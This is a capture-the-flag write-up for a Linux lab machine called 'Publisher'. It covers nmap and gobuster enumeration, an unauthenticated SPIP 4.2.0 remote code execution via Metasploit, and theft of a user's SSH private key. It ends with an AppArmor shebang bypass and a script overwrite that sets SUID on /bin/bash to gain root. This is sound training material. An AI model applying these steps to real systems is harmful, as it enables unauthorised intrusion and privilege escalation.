# Writeup: Publisher

**OS**: 🐧 Linux

**Level**: 🟢 Easy

## 🔎 Enumeration:

Nmap scan:

```shell
nmap -sS -sVC -Pn -vv -T4 -p- -oN nmap_scan $TARGET
```

Result:

```
# Nmap 7.95 scan initiated Tue Oct 28 06:56:32 2025 as: /usr/lib/nmap/nmap -sS -sVC -Pn -vv -T4 -p- -oN nmap_scan 10.10.138.42
Nmap scan report for 10.10.138.42
Host is up, received user-set (0.061s latency).
Scanned at 2025-10-28 06:56:32 UTC for 80s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 db:69:7c:97:42:43:53:80:80:fd:68:4c:40:c4:89:12 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCnOMAsBc91+xkXqDo+jikPQ4i+87SICM9EPT3uwSR8RhqHBH/Ve/emTu8is+tA9OAwfXQKdrcEQELA3Zas5yqgO9e4gUmp2HqhTE/g9sAA2SfzLKPz78o2KSuy827UnQiTzWQ4as6XySYBOeLzrWHf5o+kkxx2vs9l4ohzt9beEMMgCOdPOqVIQ1oxiQMKnX5kl7BcYoAKYhA2tKhpN6w5+LQKfOEhnMObqA8M68BEBIUrMt+KYwzh0K5Li2ZFWtFDuCCe5R1uTw0Vm1agYWa3VXWWX+5PgLjR2ZvY4X0N+11IyNAT8Zg2day5Qa+12R2EwGDdKE3JfBT1kgF8BqWsBm8k/ERZp6cmLrsmOfLmqGiwhmeX0IsOIs1kb7hqbPf6icoEAtatLEBVE7WdwrlE/Voc/V9zOZPE0scbECwfV/1vZM/71OzkHRukOrlLStNdUJ8S7gPTmJ5Beb6duksTZegFh40haQ1scqgoplmYNZg2pMbKF4o6oZrla1DcfJM=
|   256 f5:fc:3f:75:a6:cc:d4:59:6e:3b:dd:9b:e9:8c:49:15 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKLvJTVRJvE3lAngoxcdETSsWqbbHWbJXFuumZ3rkYD2TnS70E8V5v/WCY7nUW38/qq81vWEvpoJxEeJw6ayjiE=
|   256 6d:e3:9e:62:af:81:ab:39:f5:9d:02:8c:32:cd:d3:1e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKJzvOBQoOPZOJGbtkrLy4iqpm9J0P1Yl4XcaJHUmWzy
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Publisher's Pulse: SPIP Insights & Tips
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Oct 28 06:57:52 2025 -- 1 IP address (1 host up) scanned in 79.73 seconds
```

On port 80 i found a static webpage running on a SPIP CMS. I started a directory bruteforce with `gobuster` which gives me a `/spip` directory.

```
/images               (Status: 301) [Size: 313] [--> http://10.10.138.42/images/]
/server-status        (Status: 403) [Size: 277]
/spip                 (Status: 301) [Size: 311] [--> http://10.10.138.42/spip/]
```

I have done a second `gobuster` scan on `http://10.10.138.42/spip` and found some stuff to inspect.

```
gobuster dir -u http://$TARGET/spip -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt -t 40 -x php -o gobuster_scan

/tmp                  (Status: 301) [Size: 315] [--> http://10.10.138.42/spip/tmp/]
/config               (Status: 301) [Size: 318] [--> http://10.10.138.42/spip/config/]
/index.php            (Status: 200) [Size: 8141]
/local                (Status: 301) [Size: 317] [--> http://10.10.138.42/spip/local/]
/ecrire               (Status: 301) [Size: 318] [--> http://10.10.138.42/spip/ecrire/]
/prive                (Status: 301) [Size: 317] [--> http://10.10.138.42/spip/prive/]
/squelettes-dist      (Status: 301) [Size: 327] [--> http://10.10.138.42/spip/squelettes-dist/]
/vendor               (Status: 301) [Size: 318] [--> http://10.10.138.42/spip/vendor/]
/spip.php             (Status: 200) [Size: 8143]
/IMG                  (Status: 301) [Size: 315] [--> http://10.10.138.42/spip/IMG/]
/LICENSE              (Status: 200) [Size: 35147]
```

Also i found the installed version of the spip cms (`4.2.0`) in the header of the response of `http://10.10.138.43/spip/`.

```http
Composed-By: SPIP 4.2.0 @ www.spip.net + http://10.10.138.42/spip/local/config.txt
````

## 💥 Exploitation:

A quick search for the for exploits with `searchsploit spip 4.2.0` gives me a unauthenticated RCE exploit. I used metasploit to get a rce shell as the user `www-data` trough the `multi/http/spip_rce_form` exploit and was able to grab the `user.txt` inside of the home directory of the user `think`.

```shell
...
msf exploit(multi/http/spip_rce_form) > run
...

cd /home/think && cat user.txt
```

## 🔓 Priviledge Escalation:

Since the home directory of the user `think` is world readable i was able to download the `id_rsa` on my machine and ssh in to the target as user `think`.

As the user `think` i checked the usual things for privesc and found a interessting SUID binary.

```shell
find / -user root -perm /4000 2>/dev/null
...
/usr/sbin/run_container
...
```

I checked the binary with the `strings` command and found that it is running a `/opt/run_container.sh` file. By inspecting the file permissions i have found that i had write permissions on the file but modifying it fails. The issue is that the `$SHELL` is set to `/usr/sbin/ash` and there is a `apparmor` profile (`/etc/apparmor.d/usr.sbin.ash`) running for that.

```
#include <tunables/global>

/usr/sbin/ash flags=(complain) {
  #include <abstractions/base>
  #include <abstractions/bash>
  #include <abstractions/consoles>
  #include <abstractions/nameservice>
  #include <abstractions/user-tmp>

  # Remove specific file path rules
  # Deny access to certain directories
  deny /opt/ r,
  deny /opt/** w,
  deny /tmp/** w,
  deny /dev/shm w,
  deny /var/tmp w,
  deny /home/** w,
  /usr/bin/** mrix,
  /usr/sbin/** mrix,

  # Simplified rule for accessing /home directory
  owner /home/** rix,
}
```

On [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/apparmor#apparmor-shebang-bypass) i found a way to bypass the `apparmor` restrictions and was able to use the `/opt/run_container.sh` file to escalate to the `root` user and read the `root.txt`.

```shell
echo -e '#!/usr/bin/perl\nexec "/bin/sh"' > /dev/shm/privesc.pl
chmod +x /dev/shm/privesc.pl
/dev/shm/privesc.pl

$ echo '#!/bin/bash\nchmod +s /bin/bash' > /opt/run_container.sh
$ /usr/sbin/run_container
$ /bin/bash -p
bash-5.0# cat /root/root.txt
```

## 💰 Loot:

```shell
# user.txt
fa229046d44eda6a3598c7**********

# root.txt
3a4225cc9e85709adda6ef**********
```